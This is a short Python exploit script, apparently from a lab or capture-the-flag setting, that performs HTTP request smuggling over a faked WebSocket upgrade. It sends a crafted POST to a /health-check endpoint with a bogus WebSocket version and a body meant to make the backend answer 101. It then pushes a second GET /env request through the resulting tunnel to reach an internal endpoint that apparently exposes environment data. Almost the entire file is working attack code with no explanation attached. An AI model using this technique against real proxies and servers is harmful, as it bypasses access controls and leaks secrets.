import socket


#Request that initiate the "WebSocket" handshake
req1 = '''POST /health-check HTTP/1.1
Host: localhost:8000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

url=http://dummy&code=%20101%20'''

#Request smuggling that will be interpret by the proxy as WebSocket data
#The server
req2 = '''GET /env HTTP/1.1
Host: localhost:8000


'''

def read_incoming(sock):
    data = sock.recv(4096)
    data = data.decode(errors='ignore')

    print(data)

def main(netloc):
    host, port = netloc.split(':')

    #Connect to server. Open TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))

    #Request 1
    sock.sendall(req1.encode("utf-8"))
    read_incoming(sock)
    
    #Request 2
    sock.sendall(req2.encode("utf-8"))
    read_incoming(sock)

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


if __name__ == "__main__":
    main('localhost:8002')